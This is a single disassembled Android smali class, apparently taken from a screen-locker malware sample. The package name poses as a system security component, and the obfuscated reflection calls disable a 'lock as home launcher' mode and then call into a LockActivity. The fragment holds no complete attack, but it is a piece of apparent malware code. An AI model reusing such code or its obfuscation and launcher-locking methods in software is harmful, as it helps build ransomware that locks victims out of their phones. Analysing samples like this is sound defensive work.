.class public final Lˎ;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field private synthetic ˊ:Lcom/android/security/fdiduds8/LockActivity;

.field private synthetic ˋ$23aad2:Ljava/lang/Runnable;


# direct methods
.method public constructor <init>(Ljava/lang/Runnable;Lcom/android/security/fdiduds8/LockActivity;)V
    .locals 0

    .line 832
    iput-object p1, p0, Lˎ;->ˋ$23aad2:Ljava/lang/Runnable;

    iput-object p2, p0, Lˎ;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 6

    .line 836
    :try_start_0
    iget-object v0, p0, Lˎ;->ˋ$23aad2:Ljava/lang/Runnable;

    goto :goto_0

    :catchall_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v0

    throw v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    const/4 v1, 0x1

    :try_start_1
    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    aput-object v0, v1, v2

    const-string v0, "If"

    invoke-static {v0}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0

    const-string v2, "\u02ca"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Class;

    const-string v4, "If"

    invoke-static {v4}, LIf$ﹳ;->ˊ(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v4

    const/4 v5, 0x0

    aput-object v4, v3, v5

    invoke-virtual {v0, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    const/4 v2, 0x0

    invoke-virtual {v0, v2, v1}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lcom/android/security/fdiduds8/ZRuntime;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/4 v1, 0x0

    :try_start_2
    invoke-virtual {v0, v1}, Lcom/android/security/fdiduds8/ZRuntime;->enableLockAsHomeLauncher(Z)V

    .line 837
    iget-object v0, p0, Lˎ;->ˊ:Lcom/android/security/fdiduds8/LockActivity;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Lcom/android/security/fdiduds8/LockActivity;->ˊ(Ljava/lang/Object;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 841
    return-void

    .line 840
    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    .line 842
    return-void
.end method
